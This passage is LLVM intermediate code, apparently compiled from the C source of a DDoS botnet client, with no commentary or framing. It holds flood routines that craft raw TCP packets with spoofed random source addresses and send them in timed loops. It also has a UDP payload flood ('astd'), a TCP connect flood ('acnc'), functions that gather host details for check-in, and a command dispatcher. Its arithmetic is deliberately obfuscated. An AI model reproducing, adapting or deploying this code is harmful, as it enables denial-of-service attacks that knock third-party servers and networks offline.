  %208 = and i16 %207, %205
  %209 = and i16 %205, -4097
  %210 = xor i16 %208, -1
  %211 = xor i16 4096, -1
  %212 = xor i16 28211, -1
  %213 = and i16 %210, 28211
  %214 = and i16 %208, %212
  %215 = and i16 %211, 28211
  %216 = and i16 4096, %212
  %217 = or i16 %213, %214
  %218 = or i16 %215, %216
  %219 = xor i16 %217, %218
  %220 = or i16 %210, %211
  %221 = xor i16 %220, -1
  %222 = or i16 28211, %212
  %223 = and i16 %221, %222
  %224 = or i16 %219, %223
  %225 = or i16 %208, 4096
  store i16 %224, i16* %204, align 4
  %226 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %227 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %226, i32 0, i32 0
  %228 = bitcast %union.anon.1* %227 to %struct.anon.2*
  %229 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %228, i32 0, i32 4
  %230 = load i16, i16* %229, align 4
  %231 = xor i16 %230, -1
  %232 = xor i16 -2049, -1
  %233 = xor i16 -28963, -1
  %234 = or i16 %231, %232
  %235 = or i16 -28963, %233
  %236 = xor i16 %234, -1
  %237 = and i16 %236, %235
  %238 = and i16 %230, -2049
  %239 = xor i16 %237, -1
  %240 = xor i16 2048, -1
  %241 = xor i16 2022, -1
  %242 = and i16 %239, 2022
  %243 = and i16 %237, %241
  %244 = and i16 %240, 2022
  %245 = and i16 2048, %241
  %246 = or i16 %242, %243
  %247 = or i16 %244, %245
  %248 = xor i16 %246, %247
  %249 = or i16 %239, %240
  %250 = xor i16 %249, -1
  %251 = or i16 2022, %241
  %252 = and i16 %250, %251
  %253 = or i16 %248, %252
  %254 = or i16 %237, 2048
  store i16 %253, i16* %229, align 4
  br label %383

; <label>:255:                                    ; preds = %78
  %256 = load i8*, i8** %12, align 8
  %257 = call i8* @strtok(i8* %256, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i32 0, i32 0)) #6
  store i8* %257, i8** %23, align 8
  br label %258

; <label>:258:                                    ; preds = %380, %255
  %259 = load i8*, i8** %23, align 8
  %260 = icmp ne i8* %259, null
  br i1 %260, label %261, label %382

; <label>:261:                                    ; preds = %258
  %262 = load i8*, i8** %23, align 8
  %263 = call i32 @strcmp(i8* %262, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.6, i32 0, i32 0)) #10
  %264 = icmp ne i32 %263, 0
  br i1 %264, label %295, label %265

; <label>:265:                                    ; preds = %261
  %266 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %267 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %266, i32 0, i32 0
  %268 = bitcast %union.anon.1* %267 to %struct.anon.2*
  %269 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %268, i32 0, i32 4
  %270 = load i16, i16* %269, align 4
  %271 = xor i16 %270, -1
  %272 = xor i16 -513, -1
  %273 = xor i16 25375, -1
  %274 = or i16 %271, %272
  %275 = or i16 25375, %273
  %276 = xor i16 %274, -1
  %277 = and i16 %276, %275
  %278 = and i16 %270, -513
  %279 = xor i16 %277, -1
  %280 = xor i16 512, -1
  %281 = xor i16 12174, -1
  %282 = and i16 %279, 12174
  %283 = and i16 %277, %281
  %284 = and i16 %280, 12174
  %285 = and i16 512, %281
  %286 = or i16 %282, %283
  %287 = or i16 %284, %285
  %288 = xor i16 %286, %287
  %289 = or i16 %279, %280
  %290 = xor i16 %289, -1
  %291 = or i16 12174, %281
  %292 = and i16 %290, %291
  %293 = or i16 %288, %292
  %294 = or i16 %277, 512
  store i16 %293, i16* %269, align 4
  br label %380

; <label>:295:                                    ; preds = %261
  %296 = load i8*, i8** %23, align 8
  %297 = call i32 @strcmp(i8* %296, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.7, i32 0, i32 0)) #10
  %298 = icmp ne i32 %297, 0
  br i1 %298, label %313, label %299

; <label>:299:                                    ; preds = %295
  %300 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %301 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %300, i32 0, i32 0
  %302 = bitcast %union.anon.1* %301 to %struct.anon.2*
  %303 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %302, i32 0, i32 4
  %304 = load i16, i16* %303, align 4
  %305 = xor i16 -1025, -1
  %306 = xor i16 %304, %305
  %307 = and i16 %306, %304
  %308 = and i16 %304, -1025
  %309 = and i16 %307, 1024
  %310 = xor i16 %307, 1024
  %311 = or i16 %309, %310
  %312 = or i16 %307, 1024
  store i16 %311, i16* %303, align 4
  br label %379

; <label>:313:                                    ; preds = %295
  %314 = load i8*, i8** %23, align 8
  %315 = call i32 @strcmp(i8* %314, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.8, i32 0, i32 0)) #10
  %316 = icmp ne i32 %315, 0
  br i1 %316, label %331, label %317

; <label>:317:                                    ; preds = %313
  %318 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %319 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %318, i32 0, i32 0
  %320 = bitcast %union.anon.1* %319 to %struct.anon.2*
  %321 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %320, i32 0, i32 4
  %322 = load i16, i16* %321, align 4
  %323 = xor i16 -257, -1
  %324 = xor i16 %322, %323
  %325 = and i16 %324, %322
  %326 = and i16 %322, -257
  %327 = and i16 %325, 256
  %328 = xor i16 %325, 256
  %329 = or i16 %327, %328
  %330 = or i16 %325, 256
  store i16 %329, i16* %321, align 4
  br label %378

; <label>:331:                                    ; preds = %313
  %332 = load i8*, i8** %23, align 8
  %333 = call i32 @strcmp(i8* %332, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.9, i32 0, i32 0)) #10
  %334 = icmp ne i32 %333, 0
  br i1 %334, label %353, label %335

; <label>:335:                                    ; preds = %331
  %336 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %337 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %336, i32 0, i32 0
  %338 = bitcast %union.anon.1* %337 to %struct.anon.2*
  %339 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %338, i32 0, i32 4
  %340 = load i16, i16* %339, align 4
  %341 = xor i16 %340, -1
  %342 = xor i16 -4097, -1
  %343 = xor i16 5553, -1
  %344 = or i16 %341, %342
  %345 = or i16 5553, %343
  %346 = xor i16 %344, -1
  %347 = and i16 %346, %345
  %348 = and i16 %340, -4097
  %349 = and i16 %347, 4096
  %350 = xor i16 %347, 4096
  %351 = or i16 %349, %350
  %352 = or i16 %347, 4096
  store i16 %351, i16* %339, align 4
  br label %377

; <label>:353:                                    ; preds = %331
  %354 = load i8*, i8** %23, align 8
  %355 = call i32 @strcmp(i8* %354, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.10, i32 0, i32 0)) #10
  %356 = icmp ne i32 %355, 0
  br i1 %356, label %375, label %357

; <label>:357:                                    ; preds = %353
  %358 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %359 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %358, i32 0, i32 0
  %360 = bitcast %union.anon.1* %359 to %struct.anon.2*
  %361 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %360, i32 0, i32 4
  %362 = load i16, i16* %361, align 4
  %363 = xor i16 %362, -1
  %364 = xor i16 -2049, -1
  %365 = xor i16 1524, -1
  %366 = or i16 %363, %364
  %367 = or i16 1524, %365
  %368 = xor i16 %366, -1
  %369 = and i16 %368, %367
  %370 = and i16 %362, -2049
  %371 = and i16 %369, 2048
  %372 = xor i16 %369, 2048
  %373 = or i16 %371, %372
  %374 = or i16 %369, 2048
  store i16 %373, i16* %361, align 4
  br label %376

; <label>:375:                                    ; preds = %353
  br label %376

; <label>:376:                                    ; preds = %375, %357
  br label %377

; <label>:377:                                    ; preds = %376, %335
  br label %378

; <label>:378:                                    ; preds = %377, %317
  br label %379

; <label>:379:                                    ; preds = %378, %299
  br label %380

; <label>:380:                                    ; preds = %379, %265
  %381 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i32 0, i32 0)) #6
  store i8* %381, i8** %23, align 8
  br label %258

; <label>:382:                                    ; preds = %258
  br label %383

; <label>:383:                                    ; preds = %382, %141
  %384 = call i32 @rand_cmwc()
  %385 = trunc i32 %384 to i16
  %386 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %387 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %386, i32 0, i32 0
  %388 = bitcast %union.anon.1* %387 to %struct.anon.2*
  %389 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %388, i32 0, i32 5
  store i16 %385, i16* %389, align 2
  %390 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %391 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %390, i32 0, i32 0
  %392 = bitcast %union.anon.1* %391 to %struct.anon.2*
  %393 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %392, i32 0, i32 6
  store i16 0, i16* %393, align 4
  %394 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %395 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %394, i32 0, i32 0
  %396 = bitcast %union.anon.1* %395 to %struct.anon.2*
  %397 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %396, i32 0, i32 7
  store i16 0, i16* %397, align 2
  %398 = load i32, i32* %9, align 4
  %399 = icmp eq i32 %398, 0
  br i1 %399, label %400, label %402

; <label>:400:                                    ; preds = %383
  %401 = call i32 @rand_cmwc()
  br label %407

; <label>:402:                                    ; preds = %383
  %403 = load i32, i32* %9, align 4
  %404 = trunc i32 %403 to i16
  %405 = call zeroext i16 @htons(i16 zeroext %404) #9
  %406 = zext i16 %405 to i32
  br label %407

; <label>:407:                                    ; preds = %402, %400
  %408 = phi i32 [ %401, %400 ], [ %406, %402 ]
  %409 = trunc i32 %408 to i16
  %410 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %411 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %410, i32 0, i32 0
  %412 = bitcast %union.anon.1* %411 to %struct.anon.2*
  %413 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %412, i32 0, i32 1
  store i16 %409, i16* %413, align 2
  %414 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %415 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %416 = call zeroext i16 @tcpcsum(%struct.iphdr* %414, %struct.tcphdr* %415)
  %417 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %418 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %417, i32 0, i32 0
  %419 = bitcast %union.anon.1* %418 to %struct.anon.2*
  %420 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %419, i32 0, i32 6
  store i16 %416, i16* %420, align 4
  %421 = bitcast i8* %86 to i16*
  %422 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %423 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %422, i32 0, i32 2
  %424 = load i16, i16* %423, align 2
  %425 = zext i16 %424 to i32
  %426 = call zeroext i16 @csum(i16* %421, i32 %425)
  %427 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %428 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %427, i32 0, i32 7
  store i16 %426, i16* %428, align 2
  %429 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %430 = load i32, i32* %10, align 4
  %431 = sub i32 0, %429
  %432 = sub i32 0, %430
  %433 = add i32 %431, %432
  %434 = sub i32 0, %433
  %435 = add nsw i32 %429, %430
  store i32 %434, i32* %24, align 4
  store i32 0, i32* %25, align 4
  br label %436

; <label>:436:                                    ; preds = %489, %488, %407
  br label %437

; <label>:437:                                    ; preds = %436
  %438 = load i32, i32* %17, align 4
  %439 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  %440 = call i64 @sendto(i32 %438, i8* %86, i64 %83, i32 0, %struct.sockaddr* %439, i32 16)
  %441 = load i32, i32* %19, align 4
  %442 = call i32 @getRandomIP(i32 %441)
  %443 = call i32 @htonl(i32 %442) #9
  %444 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %445 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %444, i32 0, i32 8
  store i32 %443, i32* %445, align 4
  %446 = call i32 @rand_cmwc()
  %447 = trunc i32 %446 to i16
  %448 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %449 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %448, i32 0, i32 3
  store i16 %447, i16* %449, align 4
  %450 = call i32 @rand_cmwc()
  %451 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %452 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %451, i32 0, i32 0
  %453 = bitcast %union.anon.1* %452 to %struct.anon.2*
  %454 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %453, i32 0, i32 2
  store i32 %450, i32* %454, align 4
  %455 = call i32 @rand_cmwc()
  %456 = trunc i32 %455 to i16
  %457 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %458 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %457, i32 0, i32 0
  %459 = bitcast %union.anon.1* %458 to %struct.anon.2*
  %460 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %459, i32 0, i32 0
  store i16 %456, i16* %460, align 4
  %461 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %462 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %461, i32 0, i32 0
  %463 = bitcast %union.anon.1* %462 to %struct.anon.2*
  %464 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %463, i32 0, i32 6
  store i16 0, i16* %464, align 4
  %465 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %466 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %467 = call zeroext i16 @tcpcsum(%struct.iphdr* %465, %struct.tcphdr* %466)
  %468 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %469 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %468, i32 0, i32 0
  %470 = bitcast %union.anon.1* %469 to %struct.anon.2*
  %471 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %470, i32 0, i32 6
  store i16 %467, i16* %471, align 4
  %472 = bitcast i8* %86 to i16*
  %473 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %474 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %473, i32 0, i32 2
  %475 = load i16, i16* %474, align 2
  %476 = zext i16 %475 to i32
  %477 = call zeroext i16 @csum(i16* %472, i32 %476)
  %478 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %479 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %478, i32 0, i32 7
  store i16 %477, i16* %479, align 2
  %480 = load i32, i32* %25, align 4
  %481 = load i32, i32* %15, align 4
  %482 = icmp eq i32 %480, %481
  br i1 %482, label %483, label %489

; <label>:483:                                    ; preds = %437
  %484 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %485 = load i32, i32* %24, align 4
  %486 = icmp sgt i32 %484, %485
  br i1 %486, label %487, label %488

; <label>:487:                                    ; preds = %483
  br label %495

; <label>:488:                                    ; preds = %483
  store i32 0, i32* %25, align 4
  br label %436

; <label>:489:                                    ; preds = %437
  %490 = load i32, i32* %25, align 4
  %491 = sub i32 %490, 1779511065
  %492 = add i32 %491, 1
  %493 = add i32 %492, 1779511065
  %494 = add i32 %490, 1
  store i32 %493, i32* %25, align 4
  br label %436

; <label>:495:                                    ; preds = %487
  %496 = load i8*, i8** %20, align 8
  call void @llvm.stackrestore(i8* %496)
  br label %497

; <label>:497:                                    ; preds = %495, %57, %51, %44
  ret void
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8*, i8*) #5

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8*) #3

; Function Attrs: noinline nounwind uwtable
define void @astd(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i64, align 8
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca %struct.hostent*, align 8
  %11 = alloca i32, align 4
  %12 = alloca [5 x i8*], align 16
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %13 = call i32 @socket(i32 2, i32 2, i32 0) #6
  store i32 %13, i32* %7, align 4
  %14 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %15 = sext i32 %14 to i64
  store i64 %15, i64* %8, align 8
  %16 = load i8*, i8** %4, align 8
  %17 = call %struct.hostent* @gethostbyname(i8* %16)
  store %struct.hostent* %17, %struct.hostent** %10, align 8
  %18 = bitcast %struct.sockaddr_in* %9 to i8*
  call void @llvm.memset.p0i8.i64(i8* %18, i8 0, i64 16, i32 4, i1 false)
  %19 = load %struct.hostent*, %struct.hostent** %10, align 8
  %20 = getelementptr inbounds %struct.hostent, %struct.hostent* %19, i32 0, i32 4
  %21 = load i8**, i8*** %20, align 8
  %22 = getelementptr inbounds i8*, i8** %21, i64 0
  %23 = load i8*, i8** %22, align 8
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %25 = bitcast %struct.in_addr* %24 to i8*
  %26 = load %struct.hostent*, %struct.hostent** %10, align 8
  %27 = getelementptr inbounds %struct.hostent, %struct.hostent* %26, i32 0, i32 3
  %28 = load i32, i32* %27, align 4
  %29 = sext i32 %28 to i64
  call void @bcopy(i8* %23, i8* %25, i64 %29) #6
  %30 = load %struct.hostent*, %struct.hostent** %10, align 8
  %31 = getelementptr inbounds %struct.hostent, %struct.hostent* %30, i32 0, i32 2
  %32 = load i32, i32* %31, align 8
  %33 = trunc i32 %32 to i16
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 %33, i16* %34, align 4
  %35 = load i32, i32* %5, align 4
  %36 = trunc i32 %35 to i16
  %37 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %36, i16* %37, align 2
  store i32 0, i32* %11, align 4
  br label %38

; <label>:38:                                     ; preds = %65, %3
  %39 = bitcast [5 x i8*]* %12 to i8*
  call void @llvm.memset.p0i8.i64(i8* %39, i8 0, i64 40, i32 16, i1 false)
  %40 = bitcast i8* %39 to [5 x i8*]*
  %41 = getelementptr [5 x i8*], [5 x i8*]* %40, i32 0, i32 0
  store i8* getelementptr inbounds ([159 x i8], [159 x i8]* @.str.11, i32 0, i32 0), i8** %41
  %42 = getelementptr [5 x i8*], [5 x i8*]* %40, i32 0, i32 1
  store i8* getelementptr inbounds ([356 x i8], [356 x i8]* @.str.12, i32 0, i32 0), i8** %42
  %43 = getelementptr [5 x i8*], [5 x i8*]* %40, i32 0, i32 2
  store i8* getelementptr inbounds ([193 x i8], [193 x i8]* @.str.13, i32 0, i32 0), i8** %43
  %44 = getelementptr [5 x i8*], [5 x i8*]* %40, i32 0, i32 3
  store i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.14, i32 0, i32 0), i8** %44
  %45 = getelementptr [5 x i8*], [5 x i8*]* %40, i32 0, i32 4
  store i8* getelementptr inbounds ([193 x i8], [193 x i8]* @.str.15, i32 0, i32 0), i8** %45
  %46 = load i32, i32* %7, align 4
  %47 = getelementptr inbounds [5 x i8*], [5 x i8*]* %12, i32 0, i32 0
  %48 = bitcast i8** %47 to i8*
  %49 = call i64 @send(i32 %46, i8* %48, i64 1460, i32 0)
  %50 = load i32, i32* %7, align 4
  %51 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %52 = call i32 @connect(i32 %50, %struct.sockaddr* %51, i32 16)
  %53 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %54 = sext i32 %53 to i64
  %55 = load i64, i64* %8, align 8
  %56 = load i32, i32* %6, align 4
  %57 = sext i32 %56 to i64
  %58 = sub i64 0, %57
  %59 = sub i64 %55, %58
  %60 = add nsw i64 %55, %57
  %61 = icmp sge i64 %54, %59
  br i1 %61, label %62, label %65

; <label>:62:                                     ; preds = %38
  %63 = load i32, i32* %7, align 4
  %64 = call i32 @close(i32 %63)
  call void @_exit(i32 0) #11
  unreachable

; <label>:65:                                     ; preds = %38
  store i32 0, i32* %11, align 4
  %66 = load i32, i32* %11, align 4
  %67 = add i32 %66, 2041793826
  %68 = add i32 %67, 1
  %69 = sub i32 %68, 2041793826
  %70 = add i32 %66, 1
  store i32 %69, i32* %11, align 4
  br label %38
                                                  ; No predecessors!
  ret void
}

declare %struct.hostent* @gethostbyname(i8*) #2

; Function Attrs: nounwind
declare void @bcopy(i8*, i8*, i64) #3

; Function Attrs: noreturn
declare void @_exit(i32) #7

; Function Attrs: noinline nounwind uwtable
define void @acnc(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.sockaddr_in, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %10 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %11 = load i32, i32* %6, align 4
  %12 = sub i32 %10, 1314990263
  %13 = add i32 %12, %11
  %14 = add i32 %13, 1314990263
  %15 = add nsw i32 %10, %11
  store i32 %14, i32* %7, align 4
  %16 = load i8*, i8** %4, align 8
  %17 = call i32 @inet_addr(i8* %16) #6
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %19 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %18, i32 0, i32 0
  store i32 %17, i32* %19, align 4
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 2, i16* %20, align 4
  %21 = load i32, i32* %5, align 4
  %22 = trunc i32 %21 to i16
  %23 = call zeroext i16 @htons(i16 zeroext %22) #9
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %23, i16* %24, align 2
  br label %25

; <label>:25:                                     ; preds = %29, %3
  %26 = load i32, i32* %7, align 4
  %27 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %28 = icmp sgt i32 %26, %27
  br i1 %28, label %29, label %37

; <label>:29:                                     ; preds = %25
  %30 = call i32 @socket(i32 2, i32 1, i32 0) #6
  store i32 %30, i32* %8, align 4
  %31 = load i32, i32* %8, align 4
  %32 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %33 = call i32 @connect(i32 %31, %struct.sockaddr* %32, i32 16)
  %34 = call i32 @sleep(i32 1)
  %35 = load i32, i32* %8, align 4
  %36 = call i32 @close(i32 %35)
  br label %25

; <label>:37:                                     ; preds = %25
  ret void
}

declare i32 @sleep(i32) #2

; Function Attrs: noinline nounwind uwtable
define i8* @getArch() #0 {
  ret i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.16, i32 0, i32 0)
}

; Function Attrs: noinline nounwind uwtable
define i8* @getBuildz() #0 {
  %1 = alloca i8*, align 8
  %2 = call i32 @access(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.17, i32 0, i32 0), i32 0) #6
  %3 = icmp ne i32 %2, -1
  br i1 %3, label %4, label %5

; <label>:4:                                      ; preds = %0
  store i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.18, i32 0, i32 0), i8** %1, align 8
  br label %14

; <label>:5:                                      ; preds = %0
  %6 = call i32 @access(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.19, i32 0, i32 0), i32 0) #6
  %7 = icmp ne i32 %6, -1
  br i1 %7, label %8, label %9

; <label>:8:                                      ; preds = %5
  store i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.20, i32 0, i32 0), i8** %1, align 8
  br label %14

; <label>:9:                                      ; preds = %5
  %10 = call i32 @access(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.21, i32 0, i32 0), i32 0) #6
  %11 = icmp ne i32 %10, -1
  br i1 %11, label %12, label %13

; <label>:12:                                     ; preds = %9
  store i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.22, i32 0, i32 0), i8** %1, align 8
  br label %14

; <label>:13:                                     ; preds = %9
  store i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.23, i32 0, i32 0), i8** %1, align 8
  br label %14

; <label>:14:                                     ; preds = %13, %12, %8, %4
  %15 = load i8*, i8** %1, align 8
  ret i8* %15
}

; Function Attrs: nounwind
declare i32 @access(i8*, i32) #3

; Function Attrs: noinline nounwind uwtable
define i8* @getPortz() #0 {
  %1 = alloca i8*, align 8
  %2 = call i32 @access(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.17, i32 0, i32 0), i32 0) #6
  %3 = icmp ne i32 %2, -1
  br i1 %3, label %4, label %5

; <label>:4:                                      ; preds = %0
  store i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.24, i32 0, i32 0), i8** %1, align 8
  br label %14

; <label>:5:                                      ; preds = %0
  %6 = call i32 @access(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.19, i32 0, i32 0), i32 0) #6
  %7 = icmp ne i32 %6, -1
  br i1 %7, label %8, label %9

; <label>:8:                                      ; preds = %5
  store i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.24, i32 0, i32 0), i8** %1, align 8
  br label %14

; <label>:9:                                      ; preds = %5
  %10 = call i32 @access(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.21, i32 0, i32 0), i32 0) #6
  %11 = icmp ne i32 %10, -1
  br i1 %11, label %12, label %13

; <label>:12:                                     ; preds = %9
  store i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.25, i32 0, i32 0), i8** %1, align 8
  br label %14

; <label>:13:                                     ; preds = %9
  store i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.24, i32 0, i32 0), i8** %1, align 8
  br label %14

; <label>:14:                                     ; preds = %13, %12, %8, %4
  %15 = load i8*, i8** %1, align 8
  ret i8* %15
}

; Function Attrs: noinline nounwind uwtable
define i8* @getOS() #0 {
  %1 = alloca i8*, align 8
  %2 = call i32 @access(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.26, i32 0, i32 0), i32 0) #6
  %3 = icmp ne i32 %2, -1
  br i1 %3, label %4, label %5

; <label>:4:                                      ; preds = %0
  store i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.27, i32 0, i32 0), i8** %1, align 8
  br label %10

; <label>:5:                                      ; preds = %0
  %6 = call i32 @access(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.28, i32 0, i32 0), i32 0) #6
  %7 = icmp ne i32 %6, -1
  br i1 %7, label %8, label %9

; <label>:8:                                      ; preds = %5
  store i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.29, i32 0, i32 0), i8** %1, align 8
  br label %10

; <label>:9:                                      ; preds = %5
  store i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.30, i32 0, i32 0), i8** %1, align 8
  br label %10

; <label>:10:                                     ; preds = %9, %8, %4
  %11 = load i8*, i8** %1, align 8
  ret i8* %11
}

; Function Attrs: noinline nounwind uwtable
define void @processCmd(i32, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8*, align 8
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i8*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i8*, align 8
  %24 = alloca i8*, align 8
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i8*, align 8
  %29 = alloca i32, align 4
  %30 = alloca i32, align 4
  %31 = alloca i8*, align 8
  %32 = alloca i8*, align 8
  %33 = alloca i32, align 4
  %34 = alloca i32, align 4
  %35 = alloca i8*, align 8
  %36 = alloca i32, align 4
  %37 = alloca i64, align 8
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %38 = load i8**, i8*** %4, align 8
  %39 = getelementptr inbounds i8*, i8** %38, i64 0
  %40 = load i8*, i8** %39, align 8
  %41 = call i32 @strcmp(i8* %40, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.31, i32 0, i32 0)) #10
  %42 = icmp ne i32 %41, 0
  br i1 %42, label %160, label %43

; <label>:43:                                     ; preds = %2
  %44 = load i32, i32* %3, align 4
  %45 = icmp slt i32 %44, 6
  br i1 %45, label %91, label %46

; <label>:46:                                     ; preds = %43
  %47 = load i8**, i8*** %4, align 8
  %48 = getelementptr inbounds i8*, i8** %47, i64 3
  %49 = load i8*, i8** %48, align 8
  %50 = call i32 @atoi(i8* %49) #10
  %51 = icmp eq i32 %50, -1
  br i1 %51, label %91, label %52

; <label>:52:                                     ; preds = %46
  %53 = load i8**, i8*** %4, align 8
  %54 = getelementptr inbounds i8*, i8** %53, i64 2
